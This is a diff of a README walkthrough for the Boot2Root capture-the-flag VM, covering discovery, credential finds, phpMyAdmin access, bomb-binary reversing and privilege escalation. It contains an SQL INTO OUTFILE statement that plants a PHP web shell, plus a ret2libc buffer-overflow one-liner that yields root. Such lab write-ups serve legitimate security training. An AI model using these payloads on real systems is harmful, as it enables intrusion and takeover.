@@ -218,6 +218,18 @@ You'll get an online host, we'll take IP `192.168.56.101` for the demo.
 To make sure that you found the right IP, navigate to `http://192.168.56.101`, you should see the website of the B2R CTF.
 
 # Discovery
+If you don't have root permission on the host machine, setup a [Kali Linux](https://www.kali.org/) [Docker](https://www.docker.com/):
+
+```bash
+docker pull kalilinux/kali-rolling
+```
+
+You can install dependencies or packages using [`apt`](https://doc.ubuntu-fr.org/apt):
+```bash
+apt update
+apt install -y nmap gobuster
+```
+
 First, run `nmap` in attack mode (we will not care about stealth for the whole CTF):
 ```
 ➜  Boot2Root git:(master) ✗ nmap -A 192.168.128.2
@@ -316,97 +328,20 @@ Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
 Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
 ```
-A user `lmezard` tried mistyped his password `!q\]Ej?*5K5cy*AJ` as a username. Now, enter these credentials in the login page. 
+A user `lmezard` mistyped his password `!q\]Ej?*5K5cy*AJ` as a username. Now, enter these credentials in the login page of the forum. 
 
-Once you're connected, navigte to the user's page and retrieves its email: `laurie@borntosec.net `. 
+Once you're connected, navigate to the user's page and retrieve its email: `laurie@borntosec.net `. 
 
 You can then log into the webmail (`/webmail`), and access the email `DB Access`, where you'll be greated with a root access to the DB: `root` and password `Fg-'kKXBj87E:aJ$`
 
 Then, connect to the `/phpmyadmin` with these credentials.
 
-
-ifconfig -a
-
--> vboxnet0 subnet => 192.168.56.0/24
-
-nmap 192.168.56.0-255
-
-Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-26 20:10 CEST
-Nmap scan report for paul-f4Ar6s7.clusters.42paris.fr (192.168.56.1)
-Host is up (0.00013s latency).
-Not shown: 995 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-111/tcp  open  rpcbind
-2049/tcp open  nfs
-5900/tcp open  vnc
-9100/tcp open  jetdirect
-
-Nmap scan report for 192.168.56.105
-Host is up (0.0011s latency).
-Not shown: 994 closed ports
-PORT    STATE SERVICE
-21/tcp  open  ftp
-22/tcp  open  ssh
-80/tcp  open  http
-143/tcp open  imap
-443/tcp open  https
-993/tcp open  imaps
-
-
-first one is our machine, second one is the vm
-
-vm ip -> 192.168.56.105
-http open
-https open
-ftp open
-imap open
-
-we run a kali docker to check the files on the server with dirb
-
-docker pull kalilinux/kali-rolling
-apt update
-apt install -y dirb
-dirb http://192.168.56.105 /usr/share/dirb/wordlists/common.txt
-
-now we see there is an index, that give no info and a forum.
-
-We try to view it with a web browser by going to https://192.168.56.105/forum/
-
-in the forum, we find a long log file with multiple failed login attempts and then we see this line
-
-Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
-
-this user is weird and looks like a password more than a user and we see that after that, there is a successful connexion to user lmezard so we think this is the password for this user (?)
-
-ssh and ftp do not work with this user and password but we can login to the forum with it
-
-we can find her name and e-mail laurie@borntosec.net
-
-When we scanned the server ports with nmap, we saw a imap port which may tell us that a webmail is running.
-
-We try to access this webmail server with lmezard's e-mail and the password we found before and it works.
-
-We see 2 mails, one that seems to be really useful named "DB Access" and one named "Very Interesting"
-
-In the mail we see :
-
+With SELECT, we can create a new PHP page that would take an input as argument and show us the result, effectively creating a RCE exploit:
+```SQL
+SELECT "<?php if (isset($_GET['command'])) {echo '<pre>' . shell_exec($_GET['command']) . '</pre>';}?>" INTO OUTFILE "/var/www/forum/templates_c/test.php"
 ```
 
-
-Hey Laurie,
-
-You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
-
-Best regards.
-
-```
-so we now know how to connect to the db. We check if there is a phpmyadmin running and there is one and we can connect as root to it.
-
-Connecting as root to the db is not the end though.
-
-With select, we can create a new php page that would take an input as argument and show us the result :
-
+creates PHP page:
 ```php
 <?php
 if (isset($_GET['command'])) {
@@ -415,39 +350,36 @@ if (isset($_GET['command'])) {
 ?>
 ```
 
-SELECT "<?php if (isset($_GET['command'])) {echo '<pre>' . shell_exec($_GET['command']) . '</pre>';}?>" INTO OUTFILE "/var/www/forum/templates_c/test.php"
-
-Searching through the file system we found /home/LOOKATME/password with this inside
-
-https://192.168.56.105/forum/templates_c/test3.php?command=cat%20/home/LOOKATME/password
-
+Searching through the file system we find /home/LOOKATME/password
+```bash
+cat https://192.168.56.105/forum/templates_c/test3.php?command=cat%20/home/LOOKATME/password
 lmezard:G!@M6f4Eatau{sF"
+```
 
-now we try to connect in ssh, doesn't work
+These are credentials to connect to the FTP server (try the different services and see which one works).
 
-we try to connect to ftp, it works
-
-we get a fun file that is a tarball, after using tar -xpf on it we get a ft_fun folder, which contains 750 files with each one line of a c code and the order they have to be put in, so we use a small python script to get the code in the right order, remove all the useless comments and we get a c code, and when we compile and run it, we get 
-
+It contains different files. One is a README containing:
+```
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+```
+Another one is a TAR archive `fun`, that you can un-TAR with `tar -xpf` to get a `ft_fun` folder.
+It contains 750 files. Each file contains a line of a C code that needs to be put in the right order to create a program. We use a Python script (`script/decode_tarball.py`) to do that. After removing all the useless comment, we get the program, compile it and run it to get:
+```
 MY PASSWORD IS: Iheartpwnage
 Now SHA-256 it and submit
+```
 
-so we do exactly that, we sha-256 it and try to connect to ssh
+So, do as expected:
+```bash
+echo -n "Iheartpwnage" | sha256sum
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
 
-hash : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+So we connect with user 'laurie' in ssh.
 
-in the ftp we also had a README file that contained
+laurie's home contains a README and a `bomb` executable. 
 
-Complete this little challenge and use the result as password for user 'laurie' to login in ssh
-
-so we connect with user 'laurie' in ssh
-
-In the home, we have a readme and a 'bomb' executable
-
-because we are very smart, we execute the bomb, it is an executable that waits for 6 password and if we don't have them correct, it explodes and just returns
-
-the readme is an int saying
-
+`bomb` requires 6 different passwords or explodes and returns, when the README is an hint to defuse the bomb:
 ```
 Diffuse this bomb!
 When you have all the password use it as "thor" user with ssh.
@@ -462,32 +394,26 @@ o
 
 NO SPACE IN THE PASSWORD (password is case sensitive).
 ```
+Let's reverse the binary to get the password more easily. 
+1. First password
+The first one is easy and just strcmp on `Public speaking is very easy.` so we just enter it.
 
-because we did rainfall and override before this, we will reverse engineer the binary to get the passwords easily
+2. Second password
+The second password is a math check that multiplies things in weird way in a loop, answer is easy to understand: `1 2 6 24 120 720`
 
-now we have to defuse the bomb by getting the 6 passwords.
+3. Third password
+Third one gets an int, a char and another int at the end then enters a switch statement.
+By looking at the code, we see that the right combination is: `0 q 777`
 
-The first one is easy and just strcmp on "Public speaking is very easy." so we just enter it.
 
-After that, we get a small math check that multiplies things in weird way in a loop, answer is easy to understand :
+4. Fourth password
+Fourth one gets an int, passes it through a Fibonacci sequence and compares the result to 55 so we need to input the index of 55 in the Fibonacci sequence, it being `9`.
 
-1 2 6 24 120 720
+5. Fifth password
+Fifth phase is encrypting the string we give it and compares the output with "giants", we simply reverse it and check which characters we have to input to get the right output with a Python script (`script/phase_5.py`): `opekmq`
 
-Third one gets an int, a char and an other int at the end then enters a switch statement, the first one is the case where the first int is 0, requires the char to be q and second int to be 777 so we enter that:
-
-0 q 777
-
-Fourth one gets an int, passes it through a fibonacci sequence and compares the result to 55 so we need to input the index of 55 in the fibonacci sequence:
-
-9
-
-Fifth phase is encrypting the string we give it and compares the output with "giants", we simply reverse it and check which characters we have to input to get the right output with a small python script
-
-opekmq
-
-Phase 6 is ennoying, doing it later, bye
-
-We can figure out it is doing stuff with a 6 element linked list that is loaded in memory.
+6. Sixth password
+The sixth phase is more complex. We can figure out it is doing stuff with a 6 element linked list that is loaded in memory.
 With gdb, we try to find what is the content of the linked list and we get :
 
 0x804b26c <node1>:      0x000000fd      0x00000001      0x0804b260
@@ -502,23 +428,28 @@ With gdb, we try to find what is the content of the linked list and we get :
 
 0x804b230 <node6>:      0x000001b0      0x00000006      0x00000000
 
-it seems like the linked list contains 3 items : data, index and next
+it seems like the linked list contains 3 items: data, index and next
 
-converted to ints, the linked list looks like :
+After being converted to ints, the linked list looks like:
 
-253 -> 725 -> 301 -> 997 -> 212 -> 432
+`253` -> `725` -> `301` -> `997` -> `212` -> `432`
 
-The phase waits for 6 ints input and first checks that there is no duplicates and that all numbers are between 1 and 6
+The phase waits for 6 int inputs and first checks that there is no duplicates and that all numbers are between 1 and 6. The code sorts out the linked list based on the arguments you arguments you give it. Each argument represents a node to place at position n, n being the index of the argument. 
+For example, if the original list of values is:
+`253` -> `725` -> `301` -> `997` -> `212` -> `432`
 
+Then, `6 5 4 3 2 1` will give:
 
-now I got it, it takes ths input then changes the linked list in the order of the variables we give it then checks that it is sorted in reverse
+`432` -> `212` -> `997` -> `725` -> `253`
 
-so we need to take the highest to lowest indexes ie
+So we need to find the right order in which to place the node elements. After investigation, we understand that the program wants to have the nodes sorted in reverse order. 
 
-4 2 6 3 1 5
+So we need to take the highest to lowest indexes:
 
-now we have 
+`4 2 6 3 1 5`
 
+Now we have:
+```
 Public speaking is very easy.
 1 2 6 24 120 720
 1 b 214
@@ -526,18 +457,18 @@ Public speaking is very easy.
 opekmq
 4 2 6 3 1 5
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
+```
 
-we have access to thor
+This gives us the password to access account `thor`. 
 
-in thor home we get a turtle script, run it with python turtle module with a little parsing and we have access to zaz
+`thor`'s home contains a `turtle` file, that contains instructions for the `turtle` libray of Python, that draws on a Canvas. Run `scripts/turtle_script.py`, and get password `SLASH`, in `md5` that is `646da671ca01bb5d84dbb5fb2238dc8e`
 
-(password is SLASH in md5 = 646da671ca01bb5d84dbb5fb2238dc8e)
+We have a binary that is owned by `root` and that we can exploit easily byt overriding `eip` with `system` placing `/bin/sh` in the stack before, luckily `/bin/sh` is already in the stack in SHELL env variable
 
-now we have a binary that is chown by root and that we can exploit easily byt overriding eip with system placing /bin/sh in the stack before, luckily /bin/sh is already in the stack in SHELL env variable
-
+```bash
 ./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + '\x90' * 4 + '\x58\xcc\xf8\xb7')"`
+```
 
-where 0xb7e6b060 is the address of system and 0xb7f8cc58 is the address of the env variable SHELL
+Where `0xb7e6b060` is the address of system and `0xb7f8cc58` is the address of the env variable SHELL
 
-and we are root
-
+And boom, you're `root`!
